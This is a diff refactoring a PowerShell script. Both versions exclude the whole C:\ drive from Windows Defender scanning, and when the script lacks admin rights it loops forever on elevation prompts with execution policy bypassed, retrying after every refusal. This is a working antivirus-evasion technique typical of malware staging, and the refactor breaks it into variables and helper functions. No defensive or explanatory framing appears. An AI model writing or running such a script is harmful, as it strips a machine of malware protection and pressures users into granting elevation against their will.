@@ -1,34 +1,95 @@
-# Check if we're already running as administrator
-if (([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    # We're admin - do the actual work
-    Set-MpPreference -ExclusionPath "C:\" -Force
-    Write-Host "Successfully excluded C:\ from Windows Defender" -ForegroundColor Green
+# Configuration Variables
+$targetPath = "C:\"
+$successMessage = "Successfully excluded C:\ from Windows Defender"
+$verifiedMessage = "Verified: C:\ is in the exclusion list"
+$warningMessage = "Warning: C:\ may not have been added"
+$requestMessage = "Requesting administrator privileges..."
+$deniedMessage = "Elevation denied or failed. Retrying..."
+$excludedMessage = "C:\ excluded from Windows Defender"
+
+# PowerShell execution parameters
+$psExecutable = "PowerShell.exe"
+$noExitFlag = "-NoExit"
+$noProfileFlag = "-NoProfile"
+$executionPolicyFlag = "-ExecutionPolicy Bypass"
+$commandFlag = "-Command"
+
+# Get current user identity and role
+$currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
+$principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
+$adminRole = [Security.Principal.WindowsBuiltInRole]::Administrator
+$isAdmin = $principal.IsInRole($adminRole)
+
+# Function to exclude path from Windows Defender
+function Set-DefenderExclusion {
+    param([string]$Path)
+    Set-MpPreference -ExclusionPath $Path -Force
+}
+
+# Function to verify exclusion
+function Test-DefenderExclusion {
+    param([string]$Path)
+    $exclusionList = (Get-MpPreference).ExclusionPath
+    return $exclusionList -contains $Path
+}
+
+# Function to display colored message
+function Show-Message {
+    param(
+        [string]$Message,
+        [string]$Color = "White"
+    )
+    Write-Host $Message -ForegroundColor $Color
+}
+
+# Main execution logic
+if ($isAdmin) {
+    # Admin context - perform the exclusion
+    Set-DefenderExclusion -Path $targetPath
+    Show-Message -Message $successMessage -Color "Green"
     
     # Verify the exclusion was added
-    $exclusions = (Get-MpPreference).ExclusionPath
-    if ($exclusions -contains "C:\") {
-        Write-Host "Verified: C:\ is in the exclusion list" -ForegroundColor Green
+    if (Test-DefenderExclusion -Path $targetPath) {
+        Show-Message -Message $verifiedMessage -Color "Green"
     } else {
-        Write-Host "Warning: C:\ may not have been added" -ForegroundColor Yellow
+        Show-Message -Message $warningMessage -Color "Yellow"
     }
     
     pause
     exit
 }
 
-# Not admin - keep prompting using gsudo-like approach
+# Non-admin context - request elevation
 while ($true) {
-    Write-Host "Requesting administrator privileges..." -ForegroundColor Yellow
+    Show-Message -Message $requestMessage -Color "Yellow"
     
-    $CommandLine = "-NoExit -NoProfile -ExecutionPolicy Bypass -Command `"Set-MpPreference -ExclusionPath 'C:\' -Force; Write-Host 'C:\ excluded from Windows Defender' -ForegroundColor Green; pause; exit`""
+    # Build command line arguments
+    $cmdParts = @(
+        $noExitFlag,
+        $noProfileFlag,
+        $executionPolicyFlag,
+        $commandFlag,
+        "`"Set-MpPreference -ExclusionPath '$targetPath' -Force; Write-Host '$excludedMessage' -ForegroundColor Green; pause; exit`""
+    )
+    $cmdLine = $cmdParts -join " "
     
+    # Attempt to start elevated process
     try {
-        $process = Start-Process -FilePath "PowerShell.exe" -ArgumentList $CommandLine -Verb RunAs -PassThru -WindowStyle Normal
-        if ($process) {
+        $processParams = @{
+            FilePath     = $psExecutable
+            ArgumentList = $cmdLine
+            Verb         = "RunAs"
+            PassThru     = $true
+            WindowStyle  = "Normal"
+        }
+        
+        $elevatedProcess = Start-Process @processParams
+        
+        if ($elevatedProcess) {
             exit
         }
     }
     catch {
-        Write-Host "Elevation denied or failed. Retrying..." -ForegroundColor Red
+        Show-Message -Message $deniedMessage -Color "Red"
     }
 }
